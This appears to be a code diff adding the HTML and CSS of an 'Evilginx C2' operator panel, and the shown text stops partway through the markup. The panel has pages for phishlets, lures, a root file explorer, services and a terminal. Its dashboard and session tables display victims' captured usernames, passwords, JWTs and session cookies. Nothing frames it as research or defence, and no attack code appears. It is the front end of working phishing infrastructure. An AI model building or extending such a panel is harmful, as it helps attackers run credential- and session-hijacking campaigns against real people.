@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>EVILGINX C2 // PANEL</title>
+<link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32.png?v=4">
+<link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16.png?v=4">
+<link rel="shortcut icon" href="/static/favicon.ico?v=4">
+<link rel="apple-touch-icon" href="/static/apple-touch-icon.png?v=4">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e17;--bg2:#111827;--bg3:#1a2332;--bg4:#1e293b;
+  --accent:#00ff88;--accent2:#00cc6a;--accent-dim:rgba(0,255,136,0.1);
+  --cyan:#22d3ee;--red:#ef4444;--orange:#f59e0b;--purple:#a78bfa;--yellow:#facc15;
+  --text:#f1f5f9;--text2:#94a3b8;--text3:#475569;
+  --border:rgba(0,255,136,0.12);--border-h:rgba(0,255,136,0.3);
+  --font:'Inter',-apple-system,sans-serif;--mono:'JetBrains Mono','Fira Code',monospace;
+}
+html,body{height:100%;background:var(--bg);color:var(--text2);font-family:var(--font);font-size:15px;overflow:hidden}
+::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:rgba(0,255,136,0.15);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:rgba(0,255,136,0.3)}
+a{color:var(--cyan);text-decoration:none}
+.app{display:flex;height:100vh;overflow:hidden;min-width:0}
+.sidebar{width:240px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;z-index:100;transition:margin-left 0.3s cubic-bezier(0.16,1,0.3,1)}
+.app.sb-closed .sidebar{margin-left:-240px}
+.sidebar .logo{padding:22px 20px 18px;border-bottom:1px solid var(--border);text-align:center}
+.sidebar .logo img.logo-mark{width:58px;height:58px;object-fit:contain;display:block;margin:0 auto 10px;filter:drop-shadow(0 0 12px rgba(0,255,136,0.28)) drop-shadow(0 0 8px rgba(34,211,238,0.18))}
+.sidebar .logo h1{font-family:var(--font);font-size:22px;font-weight:700;letter-spacing:4px;background:linear-gradient(135deg,var(--accent),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sidebar .logo .sub{font-size:11px;color:#fff;letter-spacing:3px;margin-top:4px;font-family:var(--mono)}
+.sidebar nav{flex:1;padding:16px 10px;overflow-y:auto}
+.sidebar nav a{display:flex;align-items:center;padding:12px 18px;color:#fff;font-size:14px;font-weight:500;border-radius:8px;margin-bottom:2px;gap:12px;transition:all 0.2s;position:relative;border-left:3px solid transparent}
+.sidebar nav a i{width:20px;text-align:center;font-size:16px;transition:transform 0.25s}
+.sidebar nav a:hover{color:var(--text);background:var(--accent-dim);padding-left:22px}
+.sidebar nav a:hover i{transform:scale(1.15)}
+.sidebar nav a.active{color:var(--accent);background:var(--accent-dim);border-left-color:var(--accent);font-weight:600}
+.sidebar nav a[data-page="notifications"]:hover i{animation:bellShake 0.5s}
+@keyframes bellShake{0%,100%{transform:rotate(0)}25%{transform:rotate(12deg)}50%{transform:rotate(-12deg)}75%{transform:rotate(6deg)}}
+.sidebar nav .sep{height:1px;background:var(--border);margin:10px 12px}
+.sidebar .bottom{padding:16px 20px;border-top:1px solid var(--border)}
+.sidebar .bottom .status{display:flex;align-items:center;gap:8px;font-size:12px;margin-bottom:12px;font-weight:500}
+.sidebar .bottom .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;transition:all 0.3s}
+.sidebar .bottom .dot.on{background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulseGlow 2s infinite}
+.sidebar .bottom .dot.off{background:var(--red);box-shadow:0 0 8px var(--red)}
+@keyframes pulseGlow{0%,100%{box-shadow:0 0 4px var(--accent),0 0 12px rgba(0,255,136,0.3)}50%{box-shadow:0 0 8px var(--accent),0 0 24px rgba(0,255,136,0.5)}}
+.sidebar .bottom .logout{display:block;text-align:center;padding:10px;border:1px solid rgba(239,68,68,0.25);color:var(--red);font-size:12px;border-radius:8px;transition:all 0.25s;letter-spacing:2px;font-weight:600}
+.sidebar .bottom .logout:hover{background:rgba(239,68,68,0.1);border-color:var(--red);transform:translateY(-1px)}
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+.topbar{height:48px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 24px;flex-shrink:0}
+.topbar-left{display:flex;align-items:center;min-width:0}
+.topbar .page-title{font-size:14px;font-weight:700;color:var(--accent);letter-spacing:3px;text-transform:uppercase}
+.topbar .info{display:none}
+.topbar .info span{display:flex;align-items:center;gap:6px}
+.topbar .info .val{color:var(--cyan);font-family:var(--mono);font-size:13px}
+.content{flex:1;overflow-y:auto;overflow-x:hidden;padding:28px;min-width:0}
+.page{display:none;max-width:100%;min-width:0}
+.page.active{display:block;animation:pageIn 0.35s ease forwards}
+.dash-charts{display:grid;grid-template-columns:minmax(0,2fr) minmax(0,1fr);gap:20px;margin-bottom:20px;width:100%;max-width:100%}
+.dash-charts > *{min-width:0;overflow:hidden;background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px}
+.dash-charts canvas{max-width:100% !important}
+@media(max-width:1100px){.dash-charts{grid-template-columns:1fr}}
+@keyframes pageIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,180px),1fr));gap:16px;margin-bottom:28px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;position:relative;overflow:hidden;transition:border-color 0.3s,transform 0.2s}
+.card:hover{border-color:var(--border-h);transform:translateY(-2px)}
+.card .card-icon{font-size:22px;margin-bottom:14px;opacity:0.8}
+.card .card-icon.green{color:var(--accent)}.card .card-icon.cyan{color:var(--cyan)}.card .card-icon.orange{color:var(--orange)}.card .card-icon.purple{color:var(--purple)}
+.card .card-val{font-size:34px;font-weight:700;color:var(--text);margin-bottom:6px}
+.card .card-label{font-size:12px;color:var(--text3);text-transform:uppercase;letter-spacing:1.5px;font-weight:600}
+.tbl-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:10px;background:var(--bg2)}
+table{width:100%;border-collapse:collapse}
+th{background:var(--bg3);color:var(--accent);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;padding:14px 16px;text-align:center;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:1}
+td{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:14px;vertical-align:middle;text-align:center;color:#fff;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;transition:background 0.2s}
+tr:hover td{background:var(--accent-dim)}
+.badge{display:inline-block;padding:4px 10px;border-radius:6px;font-size:11px;letter-spacing:0.5px;font-weight:700}
+.badge.on{background:rgba(0,255,136,0.12);color:var(--accent);border:1px solid rgba(0,255,136,0.25)}
+.badge.off{background:rgba(239,68,68,0.1);color:var(--red);border:1px solid rgba(239,68,68,0.2)}
+.badge.jwt{background:rgba(167,139,250,0.12);color:var(--purple);border:1px solid rgba(167,139,250,0.25)}
+.sessFilter{border:1px solid var(--border);color:var(--text2);border-radius:8px;font-weight:600;transition:all 0.2s}
+.sessFilter:hover{border-color:var(--accent);color:var(--accent)}
+.sessFilter.active{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:700}
+.btn{padding:10px 20px;border:1px solid var(--border);color:var(--text);background:transparent;font-family:var(--font);font-size:13px;font-weight:600;cursor:pointer;border-radius:8px;transition:all 0.25s;letter-spacing:0.5px}
+.btn:hover{border-color:var(--border-h);transform:translateY(-1px)}
+.btn.sm{padding:7px 12px;font-size:12px;border-radius:6px}
+.btn.sm i{transition:transform 0.25s}
+.btn.sm:hover i{transform:rotate(8deg) scale(1.15)}
+.btn.danger{border-color:rgba(239,68,68,0.3);color:var(--red)}
+.btn.danger:hover{background:rgba(239,68,68,0.1);border-color:var(--red)}
+.btn.cyan{border-color:rgba(34,211,238,0.3);color:var(--cyan)}
+.btn.cyan:hover{background:rgba(34,211,238,0.1);border-color:var(--cyan)}
+.btn.fill{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.btn.fill:hover{filter:brightness(1.15);transform:translateY(-1px)}
+.btn-group{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;align-items:center}
+.toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;font-weight:600;color:var(--accent);margin-bottom:6px;letter-spacing:1px;text-transform:uppercase}
+.field label .hint{color:var(--text3);text-transform:none;letter-spacing:0;font-size:11px;margin-left:4px;cursor:help}
+.field input,.field select,.field textarea{width:100%;padding:12px 16px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--accent);font-family:var(--mono);font-size:14px;outline:none;transition:border-color 0.3s,box-shadow 0.3s}
+.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,0.08)}
+.field textarea{min-height:200px;resize:vertical;line-height:1.6}
+.field select{cursor:pointer}.field select option{background:var(--bg);color:var(--text)}
+.sec-title{font-size:17px;font-weight:600;color:var(--text);letter-spacing:1px;margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.sec-title i{color:var(--accent);opacity:0.7;font-size:16px}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);backdrop-filter:blur(0px);-webkit-backdrop-filter:blur(0px);z-index:1000;display:none;align-items:center;justify-content:center}
+.modal-overlay.show{display:flex;animation:overlayIn 0.3s ease forwards}
+@keyframes overlayIn{from{opacity:0;backdrop-filter:blur(0px)}to{opacity:1;backdrop-filter:blur(8px)}}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:14px;width:90%;max-width:800px;max-height:90vh;overflow-y:auto;padding:0;transform:scale(0.92) translateY(20px);opacity:0}
+.modal-overlay.show .modal{animation:modalIn 0.35s cubic-bezier(0.16,1,0.3,1) forwards}
+@keyframes modalIn{from{transform:scale(0.92) translateY(20px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+.modal .modal-head{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;border-bottom:1px solid var(--border)}
+.modal .modal-head h3{font-size:16px;font-weight:700;color:var(--accent);letter-spacing:1px}
+.modal .close{background:none;border:none;color:var(--text3);font-size:22px;cursor:pointer;transition:color 0.2s;padding:4px 8px;border-radius:6px}
+.modal .close:hover{color:var(--red);background:rgba(239,68,68,0.1)}
+.modal #modalBody{padding:24px}
+.modal .modal-foot{padding:16px 24px;display:flex;justify-content:flex-end;gap:10px;border-top:1px solid var(--border)}
+.toast-container{position:fixed;top:64px;right:20px;z-index:2000}
+.toast{padding:14px 20px;border-radius:10px;margin-bottom:8px;font-size:13px;font-weight:500;max-width:380px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);animation:toastSlide 0.4s cubic-bezier(0.16,1,0.3,1);border-left:3px solid}
+.toast.ok{background:rgba(0,255,136,0.08);border-color:var(--accent);color:var(--accent)}
+.toast.err{background:rgba(239,68,68,0.08);border-color:var(--red);color:var(--red)}
+@keyframes toastSlide{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+#terminal-container{height:calc(100vh - 130px);background:#000;border:1px solid var(--border);border-radius:10px;overflow:hidden}
+.search-box{position:relative;display:flex;align-items:center}.search-box input{width:280px;height:40px;padding:0 14px 0 38px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--font);font-size:13px;outline:none;transition:border-color 0.3s,box-shadow 0.3s}.search-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,0.08)}.search-box input::placeholder{color:var(--text3)}.search-box i{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px;pointer-events:none}
+.detail-grid{display:grid;grid-template-columns:140px 1fr;gap:10px;font-size:14px;margin-bottom:20px}
+.detail-grid .lbl{color:var(--accent);text-transform:uppercase;letter-spacing:1px;font-size:12px;font-weight:600}
+.detail-grid .val{color:var(--text2);word-break:break-all}
+.cookie-tbl td{font-family:var(--mono);font-size:12px;white-space:normal;word-break:break-all}
+.empty{text-align:center;padding:60px 20px;color:var(--text3)}
+.empty i{font-size:48px;margin-bottom:16px;opacity:0.2;display:block}
+.empty p{margin-bottom:16px;font-size:15px}
+.template-hint{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:16px 20px;margin-bottom:16px;font-size:13px;color:var(--text2);line-height:1.8}
+.template-hint code{color:var(--cyan);background:rgba(34,211,238,0.08);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:12px}
+.ev-control{display:flex;align-items:center;gap:15px;margin-bottom:25px;padding:18px 20px;background:var(--bg2);border:1px solid var(--accent);border-radius:12px;transition:border-color 0.3s}
+.ev-control .dot{width:10px;height:10px;border-radius:50%}
+.toggle-row{display:flex;align-items:center;gap:12px;cursor:pointer;padding:10px 16px;background:var(--bg);border:1px solid var(--border);border-radius:8px;transition:border-color 0.2s}
+.toggle-row:hover{border-color:var(--border-h)}
+.toggle-input{display:none}
+.toggle-switch{width:40px;height:22px;background:var(--bg3);border-radius:11px;position:relative;transition:background 0.25s;flex-shrink:0}
+.toggle-switch::after{content:'';position:absolute;top:3px;left:3px;width:16px;height:16px;background:var(--text3);border-radius:50%;transition:transform 0.25s,background 0.25s}
+.toggle-input:checked+.toggle-switch{background:var(--accent)}
+.toggle-input:checked+.toggle-switch::after{transform:translateX(18px);background:var(--bg)}
+.toggle-label{font-size:14px;color:var(--text);font-weight:500}
+.menu-toggle{display:flex;align-items:center;justify-content:center;background:none;border:1px solid var(--border);color:var(--accent);font-size:16px;cursor:pointer;width:36px;height:36px;border-radius:8px;transition:background 0.2s,border-color 0.2s;margin-right:12px;flex-shrink:0}
+.menu-toggle:hover{background:var(--accent-dim);border-color:var(--accent)}
+.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:99}
+.filter-row{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
+.filter-spacer{flex:1}
+@media(max-width:768px){
+  .sidebar{position:fixed;left:-260px;top:0;bottom:0;width:250px;margin-left:0;z-index:200;transition:left 0.3s cubic-bezier(0.16,1,0.3,1)}
+  .app.sb-closed .sidebar{margin-left:0}
+  .sidebar.open{left:0}
+  .sidebar-overlay.show{display:block}
+  .content{padding:16px}
+  .cards{grid-template-columns:1fr 1fr}
+  .topbar{padding:0 16px}
+  .filter-row{justify-content:center}
+  .filter-spacer{display:none}
+  #page-services .toolbar,#page-phishlets .toolbar,#page-lures .toolbar,#page-files .toolbar,#page-terminal .toolbar{justify-content:center}
+  #page-services .toolbar .btn-group,#page-phishlets .toolbar .btn-group,#page-lures .toolbar .btn-group,#page-files .toolbar .btn-group,#page-terminal .toolbar .btn-group{justify-content:center;width:100%}
+}
+@media(max-width:768px){
+  .btn-group{flex-direction:row;gap:4px;align-items:center;justify-content:center;flex-wrap:wrap}
+  .btn.sm{padding:5px 8px;font-size:11px;text-align:center;white-space:nowrap}
+  .ev-control{flex-wrap:wrap;gap:10px;justify-content:center}
+  .ev-control .btn{flex:1;min-width:0;text-align:center;padding:10px 8px;font-size:12px}
+  .toolbar{flex-direction:column;align-items:stretch}
+  .toolbar .btn-group{flex-direction:row;justify-content:center}
+  .form-grid{grid-template-columns:1fr}
+  .search-box,.search-box input{width:100%}
+  .tbl-wrap{overflow:visible;border:none;background:transparent}
+  .tbl-wrap table,.tbl-wrap thead,.tbl-wrap tbody,.tbl-wrap th,.tbl-wrap td,.tbl-wrap tr{display:block;width:100%}
+  .tbl-wrap thead{display:none}
+  .tbl-wrap tbody tr{
+    background:var(--bg2);border:1px solid var(--border);border-radius:12px;
+    margin-bottom:12px;padding:6px 14px;overflow:hidden
+  }
+  .tbl-wrap tbody tr:hover td{background:transparent}
+  .tbl-wrap td{
+    display:flex;justify-content:space-between;align-items:center;gap:12px;
+    text-align:right;white-space:normal;word-break:break-word;overflow:visible;
+    text-overflow:unset;max-width:none;padding:10px 0;
+    border-bottom:1px solid rgba(255,255,255,0.06)
+  }
+  .tbl-wrap td:last-child{border-bottom:none}
+  .tbl-wrap td::before{
+    content:attr(data-label);font-size:11px;font-weight:600;color:var(--text3);
+    text-transform:uppercase;letter-spacing:1px;text-align:left;flex-shrink:0;max-width:42%
+  }
+  .tbl-wrap td[colspan]{display:block;text-align:center;justify-content:center;border-bottom:none}
+  .tbl-wrap td[colspan]::before{display:none}
+  .tbl-wrap td .btn-group{justify-content:flex-end;flex:1}
+}
+
+@media(max-width:768px){
+  .sessFilter{padding:8px 12px;font-size:11px}
+  #page-sessions > div:first-of-type{justify-content:center}
+  .card-val{font-size:24px}
+  .dash-charts{grid-template-columns:1fr}
+  .card-label{font-size:10px}
+  .card{padding:16px}
+}
+.tbl-loader-wrap{position:relative;min-height:220px}
+.sess-loader{position:absolute;inset:0;z-index:5;display:none;align-items:center;justify-content:center;flex-direction:column;gap:18px;background:rgba(10,14,23,0.82);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);border-radius:10px}
+.sess-loader.show{display:flex;animation:pageIn 0.25s ease}
+.sess-ring{width:56px;height:56px;border-radius:50%;border:3px solid rgba(0,255,136,0.15);border-top-color:var(--accent);border-right-color:var(--cyan);animation:sessSpin 0.85s linear infinite;box-shadow:0 0 18px rgba(0,255,136,0.25)}
+@keyframes sessSpin{to{transform:rotate(360deg)}}
+.sess-loader-text{font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--accent);font-family:var(--mono)}
+.sess-dots{display:flex;gap:6px}
+.sess-dots span{width:6px;height:6px;border-radius:50%;background:var(--accent);animation:sessDot 1.2s ease-in-out infinite}
+.sess-dots span:nth-child(2){animation-delay:0.2s}
+.sess-dots span:nth-child(3){animation-delay:0.4s}
+@keyframes sessDot{0%,80%,100%{opacity:0.2;transform:scale(0.7)}40%{opacity:1;transform:scale(1)}}
+.fr-bar{display:flex;align-items:flex-end;gap:10px;margin:0 0 10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:10px}
+.fr-bar .fr-field{flex:1;min-width:0}
+.fr-bar .fr-field label{display:block;font-size:11px;font-weight:600;color:var(--accent);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px}
+.fr-bar .fr-field input{width:100%;height:40px;padding:0 12px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;color:#fff;font-family:var(--mono);font-size:13px;outline:none;transition:border-color 0.3s,box-shadow 0.3s}
+.fr-bar .fr-field input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,0.08)}
+.fr-bar .fr-field input::placeholder{color:rgba(255,255,255,0.4)}
+.fr-bar .btn{height:40px;white-space:nowrap;flex-shrink:0}
+@media(max-width:768px){.fr-bar{flex-wrap:wrap}.fr-bar .btn{width:100%}}
+.fe-bar{display:flex;align-items:center;gap:8px;margin-bottom:14px;flex-wrap:wrap}
+.fe-crumbs{display:flex;flex-wrap:wrap;align-items:center;gap:4px;flex:1;min-width:0;font-family:var(--mono);font-size:13px}
+.fe-crumb{color:var(--cyan);cursor:pointer;padding:4px 6px;border-radius:6px}
+.fe-crumb:hover{background:var(--accent-dim);color:var(--accent)}
+.fe-sep{color:var(--text3)}
+.fe-row{cursor:pointer}
+.fe-row.sel td{background:rgba(0,255,136,0.12)}
+.fe-ico{width:18px;display:inline-block;text-align:center;margin-right:8px}
+.fe-ico.dir{color:var(--cyan)}
+.fe-ico.file{color:#fff}
+.svc-dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:6px}
+.svc-dot.on{background:var(--accent);box-shadow:0 0 8px var(--accent)}
+.svc-dot.off{background:var(--red)}
+.log-view{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:14px;font-family:var(--mono);font-size:12px;color:#fff;white-space:pre-wrap;word-break:break-all;max-height:420px;overflow:auto;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="app">
+<aside class="sidebar">
+  <div class="logo"><img class="logo-mark" src="/static/logo.png?v=4" alt=""><h1>EVILGINX</h1><div class="sub">C2 PANEL v3.1</div></div>
+  <nav>
+    <a href="#" data-page="dashboard" class="active"><i class="fa-solid fa-chart-line"></i>Dashboard</a>
+    <a href="#" data-page="phishlets"><i class="fa-solid fa-fish-fins"></i>Phishlets</a>
+    <a href="#" data-page="config"><i class="fa-solid fa-sliders"></i>Configuration</a>
+    <a href="#" data-page="lures"><i class="fa-solid fa-link"></i>Lures</a>
+    <a href="#" data-page="files"><i class="fa-solid fa-folder-open"></i>File Explorer</a>
+    <a href="#" data-page="services"><i class="fa-solid fa-gears"></i>Services</a>
+    <a href="#" data-page="notifications"><i class="fa-solid fa-bell"></i>Notifications</a>
+    <div class="sep"></div>
+    <a href="#" data-page="sessions"><i class="fa-solid fa-shield-halved"></i>Sessions</a>
+    <a href="#" data-page="terminal"><i class="fa-solid fa-terminal"></i>Terminal</a>
+  </nav>
+  <div class="bottom">
+    <div class="status" id="evStatus"><div class="dot off" id="evDot"></div><span id="evLabel">CHECKING...</span></div>
+    <a href="/logout" class="logout">LOGOUT</a>
+  </div>
+</aside>
+<div class="main">
+  <header class="topbar">
+    <div class="topbar-left"><button class="menu-toggle" onclick="toggleSidebar()" title="Toggle menu"><i class="fa-solid fa-bars"></i></button><div class="page-title" id="pageTitle">DASHBOARD</div></div>
+    <div class="info"><span><i class="fa-solid fa-globe"></i> <span class="val" id="topDomain">—</span></span><span><i class="fa-solid fa-network-wired"></i> <span class="val" id="topIp">—</span></span></div>
+  </header>
+  <div class="content">
+<section id="page-dashboard" class="page active">
+  <div class="cards">
+    <div class="card"><div class="card-icon green"><i class="fa-solid fa-fish-fins"></i></div><div class="card-val" id="dPhishlets">0</div><div class="card-label">Active Phishlets</div></div>
+    <div class="card"><div class="card-icon cyan"><i class="fa-solid fa-users"></i></div><div class="card-val" id="dSessions">0</div><div class="card-label">Total Sessions</div></div>
+    <div class="card"><div class="card-icon orange"><i class="fa-solid fa-key"></i></div><div class="card-val" id="dJwt">0</div><div class="card-label">JWT Captured</div></div>
+    <div class="card"><div class="card-icon purple"><i class="fa-solid fa-clock"></i></div><div class="card-val" id="dUptime">—</div><div class="card-label">Server Uptime</div></div>
+  </div>
+  <div class="dash-charts">
+    <div>
+      <div class="sec-title" style="margin-bottom:12px"><i class="fa-solid fa-chart-area"></i> Sessions Timeline <span style="font-size:12px;color:var(--text3);font-weight:400;margin-left:8px">(last 7 days)</span></div>
+      <div style="position:relative;height:280px"><canvas id="chartTimeline"></canvas></div>
+    </div>
+    <div>
+      <div class="sec-title" style="margin-bottom:12px"><i class="fa-solid fa-chart-pie"></i> Session Breakdown</div>
+      <div style="position:relative;height:220px;display:flex;align-items:center;justify-content:center"><canvas id="chartBreakdown"></canvas></div>
+      <div id="breakdownLegend" style="margin-top:16px;display:flex;flex-direction:column;gap:8px"></div>
+    </div>
+  </div>
+  <div style="margin-top:20px">
+    <div class="sec-title"><i class="fa-solid fa-key"></i> Recent JWT Sessions</div>
+    <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Phishlet</th><th>IP</th><th>Username</th><th>Password</th><th>Time</th><th>Actions</th></tr></thead><tbody id="recentJwtBody"></tbody></table></div>
+  </div>
+</section>
+<section id="page-phishlets" class="page">
+  <div class="toolbar"><div class="sec-title" style="margin:0;border:0;padding:0"><i class="fa-solid fa-fish-fins"></i> Phishlets</div><div class="btn-group"><button class="btn fill" onclick="openNewPhishlet()"><i class="fa-solid fa-plus"></i> New Phishlet</button><button class="btn cyan" onclick="loadPhishlets()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button></div></div>
+  <div class="tbl-wrap"><table><thead><tr><th>Name</th><th>Author</th><th>Hostname</th><th>Status</th><th>Visible</th><th>Actions</th></tr></thead><tbody id="phishletsBody"></tbody></table></div>
+</section>
+<section id="page-config" class="page">
+  <div class="sec-title"><i class="fa-solid fa-sliders"></i> Evilginx Configuration</div>
+  <div class="ev-control">
+    <div class="dot" id="evDotCfg"></div>
+    <span id="evLabelCfg" style="font-weight:600;color:var(--text3)">CHECKING...</span>
+    <div style="flex:1"></div>
+    <button class="btn fill" id="evToggleBtn" onclick="toggleEvilginx()"><i class="fa-solid fa-power-off"></i> <span id="evToggleText">START</span></button>
+    <button class="btn cyan" onclick="restartEvilginxCfg()"><i class="fa-solid fa-arrows-rotate"></i> RESTART</button>
+  </div>
+  <div class="sec-title" style="margin-top:10px"><i class="fa-solid fa-fish-fins"></i> Phishlets Configuration</div>
+  <div class="template-hint"><strong style="color:var(--accent)">i</strong> Quick setup wizard: configure domain, hostname, IP, create lure and enable phishlet — all in one step. Enable/Disable takes effect immediately on the running evilginx process.</div>
+  <div class="toolbar"><div></div><button class="btn fill" onclick="openQuickSetup()"><i class="fa-solid fa-rocket"></i> Quick Setup</button></div>
+  <div class="tbl-wrap"><table><thead><tr><th>Name</th><th>Hostname</th><th>Status</th><th>Actions</th></tr></thead><tbody id="cfgPhBody"></tbody></table></div>
+</section>
+<section id="page-lures" class="page">
+  <div class="toolbar"><div class="sec-title" style="margin:0;border:0;padding:0"><i class="fa-solid fa-link"></i> Lures</div><div class="btn-group"><button class="btn fill" onclick="openNewLure()"><i class="fa-solid fa-plus"></i> New Lure</button><button class="btn cyan" onclick="loadLures()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button></div></div>
+  <div class="template-hint"><strong style="color:var(--accent)">i Quick Guide:</strong> <code>lures create &lt;phishlet&gt;</code> — create | <code>lures edit &lt;id&gt; path /</code> — set path | <code>lures get-url &lt;id&gt;</code> — get URL</div>
+  <div class="tbl-wrap"><table><thead><tr><th>#</th><th>Phishlet</th><th>Path</th><th>URL</th><th>Paused</th><th>Actions</th></tr></thead><tbody id="luresBody"></tbody></table></div>
+</section>
+
+<section id="page-files" class="page">
+  <div class="toolbar"><div class="sec-title" style="margin:0;border:0;padding:0"><i class="fa-solid fa-folder-open"></i> File Explorer</div>
+    <div class="btn-group">
+      <button class="btn" onclick="feGoUp()"><i class="fa-solid fa-arrow-up"></i> Up</button>
+      <button class="btn" onclick="feGo('/root')"><i class="fa-solid fa-house"></i> Home</button>
+      <button class="btn" onclick="feNewFile()"><i class="fa-solid fa-file-circle-plus"></i> New File</button>
+      <button class="btn" onclick="feNewDir()"><i class="fa-solid fa-folder-plus"></i> New Folder</button>
+      <button class="btn fill" onclick="feMakeService()"><i class="fa-solid fa-gears"></i> Make Service</button>
+      <button class="btn cyan" onclick="loadFiles()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+    </div>
+  </div>
+  <div class="fe-bar"><div class="fe-crumbs" id="feCrumbs"></div></div>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th></tr></thead>
+    <tbody id="feBody"></tbody>
+  </table></div>
+</section>
+<section id="page-services" class="page">
+  <div class="toolbar"><div class="sec-title" style="margin:0;border:0;padding:0"><i class="fa-solid fa-gears"></i> Services</div>
+    <div class="btn-group">
+      <button class="btn fill" onclick="openNewService()"><i class="fa-solid fa-plus"></i> New Service</button>
+      <button class="btn cyan" onclick="loadServices()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+    </div>
+  </div>
+  <div class="filter-row">
+    <button class="btn fill sessFilter active" data-svc="running" onclick="filterServices('running',this)">RUNNING</button>
+    <button class="btn sessFilter" data-svc="custom" onclick="filterServices('custom',this)">CUSTOM</button>
+    <button class="btn sessFilter" data-svc="all" onclick="filterServices('all',this)">ALL</button>
+  </div>
+  <div id="svcCount" style="margin-bottom:12px;color:var(--text3);font-size:13px;font-weight:500"></div>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Service</th><th>Status</th><th>Enabled</th><th>PID</th><th>Description</th><th>Actions</th></tr></thead>
+    <tbody id="svcBody"></tbody>
+  </table></div>
+</section>
+<section id="page-sessions" class="page">
+  <div class="sec-title"><i class="fa-solid fa-shield-halved"></i> Sessions</div>
+  <div class="filter-row" id="sessFilters">
+    <button class="btn fill sessFilter active" data-filter="all" onclick="filterSessions('all',this)">ALL</button>
+    <button class="btn sessFilter" data-filter="jwt" onclick="filterSessions('jwt',this)"><i class="fa-solid fa-key"></i> WITH JWT</button>
+    <button class="btn sessFilter" data-filter="tokens" onclick="filterSessions('tokens',this)"><i class="fa-solid fa-cookie-bite"></i> WITH TOKENS</button>
+    <button class="btn sessFilter" data-filter="empty" onclick="filterSessions('empty',this)"><i class="fa-solid fa-ban"></i> EMPTY</button>
+    <div class="filter-spacer"></div>
+    <div class="search-box"><i class="fa-solid fa-magnifying-glass"></i><input id="sessSearch" placeholder="Search by ID, IP, username..." oninput="searchSessions(this.value)"></div>
+    <button class="btn" onclick="loadSessions()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+    <button class="btn danger" onclick="openClearSessions()"><i class="fa-solid fa-database"></i> CLEAR DATABASE</button>
+  </div>
+  <div id="sessCount" style="margin-bottom:12px;color:var(--text3);font-size:13px;font-weight:500"></div>
+  <div class="tbl-loader-wrap">
